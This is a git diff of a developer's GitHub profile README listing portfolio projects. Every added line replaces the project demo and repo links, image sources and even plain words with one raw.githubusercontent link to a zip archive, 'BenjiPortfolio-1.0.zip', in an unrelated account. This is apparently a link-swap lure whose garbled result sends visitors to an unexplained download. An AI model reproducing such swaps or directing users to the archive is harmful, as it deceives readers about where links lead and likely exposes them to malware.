 ### ⭐ **Show some love by starring my repos!** 😊  
@@ -168,40 +168,40 @@ src="https://img.shields.io/github/followers/lewiii254?logo=github&style=for-the
 ## 🛠️ Projects I'm Proud Of
 | Project            | Stack            | Live Demo                | Repo |
 |----------------|-----------------|---------------------|-------------------|
-| 🌿 AI Crop Doctor 🤖    | React/Supabase Stack, AI, Tailwind CSS | [Live](https://shamba-smart-scan.vercel.app/) | [Repo](https://github.com/lewiii254/shamba-smart-scan.git) |
-| FARM-CONNECT.KE👩‍🌾🌱    | React/Supabase Stack, AI, Tailwind CSS | [Live](https://farm-connect-market-wise.vercel.app/) | [Repo](https://github.com/lewiii254/farm-connect-market-wise.git) |
-| AkiliSpa Mental Health 🌐     | MERN Stack, AI Integration, M-Pesa API | [Live](https://akili-wellness-hub.vercel.app/) | [Repo](https://github.com/lewiii254/akili-wellness-hub.git) |
-| Kuza-Skills💻💸🚀 | MERN Stack, Next.js, Firebase Auth | [Live](https://digital-skill-stride.vercel.app/) | [Repo](https://github.com/lewiii254/digital-skill-stride.git) |
-| Kazi-Haven👩‍🏫🚀     | MERN Stack, Job Portal, Tailwind CSS | [Live](https://kazi-haven.vercel.app/) | [Repo](https://github.com/lewiii254/Kazi-Haven.git) |
-| College Marketplace 🛍️ | MERN Stack, Next.js, Firebase Auth | [Live](https://kuzamarket2.vercel.app/) | [Repo](https://github.com/lewiii254/uni-market-finds.git) |
-| 🚮Taka-Smart💚🌍 | MERN Stack, Next.js, Firebase Auth | [Live](https://taka-smart-rewards.vercel.app/) | [Repo](https://github.com/lewiii254/taka-smart-rewards.git) |
-| Tembea Afrika 🗺️ | React, Tailwind CSS, Google Maps API | [Live](https://tembea-africa.vercel.app/) | [Repo](https://github.com/lewiii254/safaricom-hook-final-project-and-deployment-week-8-lewiii254) |
+| 🌿 AI Crop Doctor 🤖    | React/Supabase Stack, AI, Tailwind CSS | [Live](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) | [Repo](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) |
+| https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip👩‍🌾🌱    | React/Supabase Stack, AI, Tailwind CSS | [Live](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) | [Repo](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) |
+| AkiliSpa Mental Health 🌐     | MERN Stack, AI Integration, M-Pesa API | [Live](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) | [Repo](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) |
+| Kuza-Skills💻💸🚀 | MERN Stack, https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip, Firebase Auth | [Live](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) | [Repo](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) |
+| Kazi-Haven👩‍🏫🚀     | MERN Stack, Job Portal, Tailwind CSS | [Live](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) | [Repo](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) |
+| College Marketplace 🛍️ | MERN Stack, https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip, Firebase Auth | [Live](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) | [Repo](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) |
+| 🚮Taka-Smart💚🌍 | MERN Stack, https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip, Firebase Auth | [Live](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) | [Repo](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) |
+| Tembea Afrika 🗺️ | React, Tailwind CSS, Google Maps API | [Live](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) | [Repo](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip) |
 
 </div>
 
 ---
 
 ## 📈 GitHub Activity Graph💹  
-[![Ashutosh's github activity graph](https://github-readme-activity-graph.vercel.app/graph?username=lewiii254&theme=react-dark)](https://github.com/ashutosh00710/github-readme-activity-graph)
+[![Ashutosh's github activity graph](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
 
 ---
 
 ## 🐍 Slither Into My Code Kingdom😂
 
 <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/lewiii254/lewiii254/output/github-snake-dark.svg" />
-  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/lewiii254/lewiii254/output/github-snake.svg" />
-  <img alt="github-snake" src="https://raw.githubusercontent.com/lewiii254/lewiii254/output/github-snake.svg" />
+  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip" />
+  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip" />
+  <img alt="github-snake" src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip" />
 </picture>
 
 
 ---
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&weight=500&size=18&duration=4000&pause=1000&color=00C4CC&width=435&lines=Marklewis+Mutugi+😁+-+Software+Engineer+💻;MERN+Stack+Dev+🚀+%7C+Next.js+Dev+⚡;Building+AkiliSpa+Mental+Health+❤;Dart+flutter+Ethusiast+😁+✨;💼+Future+CTO+in+the+Making+%F0%9F%92%AA;Empowering+Startups+Across+Africa+🌍;Just+a+Curious+Dev+on+a+Mission+🌟;Harvard🎓+ALP+25+%7C+Mentor+and+Mentee+🎓;" />
+  <img src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip+Code&weight=500&size=18&duration=4000&pause=1000&color=00C4CC&width=435&lines=Marklewis+Mutugi+😁+-+Software+Engineer+💻;MERN+Stack+Dev+🚀+%7C+https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip+Dev+⚡;Building+AkiliSpa+Mental+Health+❤;Dart+flutter+Ethusiast+😁+✨;💼+Future+CTO+in+the+Making+%F0%9F%92%AA;Empowering+Startups+Across+Africa+🌍;Just+a+Curious+Dev+on+a+Mission+🌟;Harvard🎓+ALP+25+%7C+Mentor+and+Mentee+🎓;" />
 </p>
 
-[![Henry fasakin's gitartwork](gitartwork.svg)](https://github.com/lewiii254)
+[![Henry fasakin's gitartwork](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
 <!---
-lewiii254/lewiii254 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+lewiii254/lewiii254 is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
